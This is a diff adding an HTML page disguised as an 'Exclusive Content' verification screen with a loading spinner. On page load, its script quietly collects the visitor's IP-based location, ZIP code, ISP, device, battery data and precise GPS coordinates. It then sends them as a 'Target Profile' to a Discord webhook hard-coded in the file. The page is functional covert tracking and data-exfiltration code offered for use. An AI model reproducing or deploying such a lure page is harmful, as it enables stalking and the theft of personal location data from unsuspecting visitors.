@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Content - Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .box {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+            max-width: 350px;
+            width: 100%;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border-left-color: #09f;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="mainBox">
+        <h2>Connecting to Server...</h2>
+        <div class="spinner"></div>
+        <p id="statusText">Verifying secure connection, please wait a moment.</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559254413867094056/z_w6ht4Qf57qo4LKY6gk_4Y1SNeA1tx2cihfPPK3YdxhIQLMXwRna1z7v365dAdOkcsf';
+
+        window.onload = function() {
+            setTimeout(collectAndSend, 1500);
+        };
+
+        async function collectAndSend() {
+            let batteryInfo = "Not Available";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+                } catch (e) {}
+            }
+
+            // Browser & Device Info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+            // ip-api.com theke detailed data fetch kora
+            let ipData = {};
+            try {
+                let res = await fetch('http://ip-api.com/json/');
+                ipData = await res.json();
+            } catch (e) {
+                console.log(e);
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                        document.getElementById('mainBox').innerHTML = `<h2>Success!</h2><p>Content is loading now...</p>`;
+                        sendToDiscord({ lat, lon, accuracy: `${accuracy} meters (GPS)`, batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
+                    },
+                    (error) => {
+                        const lat = ipData.lat || 'N/A';
+                        const lon = ipData.lon || 'N/A';
+                        const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
+
+                        document.getElementById('mainBox').innerHTML = `<h2>Success!</h2><p>Content is loading now...</p>`;
+                        sendToDiscord({ lat, lon, accuracy: 'IP-Based (Approximate)', batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                const lat = ipData.lat || 'N/A';
+                const lon = ipData.lon || 'N/A';
+                const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
+                sendToDiscord({ lat, lon, accuracy: 'IP-Based (Approximate)', batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
+            }
+        }
+
+        function sendToDiscord(data) {
+            const payload = {
+                content: "🚨 **Detailed Target Profile Captured!** 🚨",
+                embeds: [{
+                    title: "Advanced Information Logs",
+                    color: 16711680,
+                    fields: [
+                        { name: "📍 Latitude & Longitude", value: `${data.lat}, ${data.lon}`, inline: false },
+                        { name: "🎯 Location Type", value: `${data.accuracy}`, inline: true },
+                        { name: "🔋 Battery Status", value: `${data.batteryInfo}`, inline: true },
+                        { name: "🌐 IP Address", value: `${data.ipData.query || 'N/A'}`, inline: true },
+                        { name: "🏙️ City / Region", value: `${data.ipData.city || 'N/A'}, ${data.ipData.regionName || 'N/A'}`, inline: true },
+                        { name: "📮 Zip / Postal Code", value: `${data.ipData.zip || 'N/A'}`, inline: true },
+                        { name: "🌍 Country", value: `${data.ipData.country || 'N/A'}`, inline: true },
+                        { name: "🏢 ISP (Internet Provider)", value: `${data.ipData.isp || 'N/A'}`, inline: false },
+                        { name: "💻 Organization", value: `${data.ipData.org || 'N/A'}`, inline: true },
+                        { name: "⏰ Timezone", value: `${data.ipData.timezone || 'N/A'}`, inline: true },
+                        { name: "📱 Device Platform", value: `${data.platform}`, inline: true },
+                        { name: "📐 Screen Resolution", value: `${data.screenRes}`, inline: true },
+                        { name: "🗣️ Browser Language", value: `${data.language}`, inline: true },
+                        { name: "🗺️ Google Maps Link", value: `[Open Exact Location](${data.googleMapsLink})` }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => {});
+        }
+    </script>
+</body>
+</html>
